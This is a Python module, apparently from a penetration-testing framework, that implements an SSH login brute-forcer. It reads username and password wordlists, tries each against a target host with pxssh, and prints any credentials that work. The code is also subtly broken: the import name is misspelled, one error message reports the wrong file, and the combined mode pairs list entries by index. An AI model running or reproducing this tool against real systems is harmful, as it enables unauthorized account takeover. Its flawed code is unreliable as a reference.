#!/usr/bin/env python
# encoding: utf-8
from pexcept import pxssh
import os
from core.Option import *
from protocol.tcp.TCPClient import TCPClient


class Exploit(TCPClient):
    __info__ = {
        "name": "ssh_login",
        "description": "ssh_login",
        "authors": (
            "jiushi",
        ),
        "references": (
            "www.422926799.github.io"
            "www.422926799.github.io"
        ),
    }

    target = IPOption("", "Setting up IP")
    port = PortOption(22, "Target SSH port")
    username = StringOption("root", "Username")
    password = StringOption("", "password")
    user_file = StringOption("", "USER file")
    password_file = StringOption("", "password file")
    
    def __init__(self):
        self.end_flag = "<"
        
    def run(self):
        rhost = self.target
        rport = self.port
        username = self.username
        password = self.password
        user_file = self.user_file
        passwd_file = self.password_file
        print('[+] rhost: {}'.format(rhost))
        print('[+] rport: {}'.format(rport))
        if username != '' and password == '' and passwd_file != '':
            if os.path.exists(passwd_file):
                print('[+] password file: {} ok'.format(passwd_file))
            else:
                print('[-] {} Not Found'.format(passwd_file))
            dk = open(passwd_file, 'r')
            for p in dk.readlines():
                qc = "".join(p.split('\n'))
                try:
                    k = pxssh.pxssh()
                    k.login(rhost, username, qc, port=rport)
                    print('[+] username: {} password: {}'.format(username, qc))
                except:
                    print('[-] Not username: {} or password: {}'.format(username, qc))
        if username != '' and passwd_file == '' and password != '':
            try:
                s = pxssh.pxssh()
                s.login(rhost, username, password, port=rport)
                print('[+] username: {} password: {}'.format(username, password))
            except:
                print('[-] Not username: {} or password: {}'.format(username, password))
        if username == '' and user_file != '' and password != '':
            if os.path.exists(user_file):
                print('[+] user_file: {} ok'.format(user_file))
            else:
                print('[-] {} Not Found'.format(passwd_file))
            dk=open(user_file, 'r')
            for u in dk.readlines():
                qc2 = "".join(u.split('\n'))
                try:
                    u = pxssh.pxssh()
                    u.login(rhost, qc2, password, port=rport)
                    print('[+] username: {} password: {}'.format(qc2, password))
                except:
                    print('[-] Not username:{} or password:{}'.format(qc2, password))
        if username == '' and password == '' and user_file != '' and passwd_file != '':
            users = []
            passes = []
            if os.path.exists(user_file):
                print('[+] user_file: {} ok'.format(user_file))
            else:
                print('[-] {} Not Found'.format(user_file))
            if os.path.exists(passwd_file):
                print('[+] password_file: {}'.format(passwd_file))
            else:
                print('[-] {} Not Found'.format(passwd_file))
            dk = open(user_file, 'r')
            for r in dk.readlines():
                qc = "".join(r.split('\n'))
                users.append(qc)
            dk2 = open(passwd_file, 'r')
            for s in dk2.readlines():
                qc3 = "".join(s.split('\n'))
                passes.append(qc3)
            for y in range(0, len(users)):
                try:
                    pw = pxssh.pxssh()
                    pw.login(rhost, users[y], passes[y], port=rport)
                    print('[+] username: {} password: {}'.format(users[y], passes[y]))
                except:
                    print('[-] username: {} password: {}'.format(users[y], passes[y]))
